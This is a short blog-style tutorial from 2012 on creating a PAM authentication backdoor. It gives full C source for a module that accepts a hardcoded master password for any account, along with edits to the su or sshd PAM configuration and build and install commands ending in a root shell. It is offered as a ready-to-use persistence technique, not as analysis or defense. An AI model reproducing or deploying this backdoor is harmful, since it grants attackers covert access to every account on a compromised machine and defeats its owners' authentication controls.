---
layout: post
title:  "Tiny PAM Authentication Module Backdoor"
date:   2012-04-08 18:22:00
categories: coding security
permalink: post/tiny-pam-authentication-module-backdoor/
---

This trick explains you how to create a **PAM module backdoor** that allow you to login in any account of system with your own password.

### Example of pam_bd.so module as backdoor

{% highlight c %}
/* pam_bd.so - Simple PAM Module Backdoor */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define BACKPASS "SET_BACKDOOR_PASSWORD"

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv) {
        char *password = NULL;
        pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);

        if(!strncmp(password, BACKPASS, strlen(BACKPASS)))
                return PAM_SUCCESS;

        return -1;
}
{% endhighlight %}

### Configuration

Now we need to configure PAM to load our module, first edit `/etc/pam.d/su` (if you want you can edit `/etc/pam.d/sshd` or other services that uses PAM system to perform authentication) and add/mod the lines below:

{% highlight text %}
#%PAM-1.0
nauth           sufficient      pam_rootok.so
auth            sufficient      pam_unix.so      # CHANGE TO "SUFFICIENT"
account         required        pam_unix.so
session         required        pam_unix.so
auth            sufficient      pam_bd.so        # ADD YOUR PAM MODULE FOR AUTH
account         sufficient      pam_bd.so        # ADD YOUR PAM MODULE FOR ACCOUNT
{% endhighlight %}

### Build It as library and try Login

{% highlight bash %}
eurialo $ gcc -fPIC -fno-stack-protector -c pam_bd.c
eurialo $ sudo ld -x --shared -o /lib/security/pam_bd.so pam_bd.o
eurialo $ rm pam_bd.o
eurialo $ su - root
Password: *REAL PASSWD* OR *FAKE PASSWD*
root ~ #
{% endhighlight %}
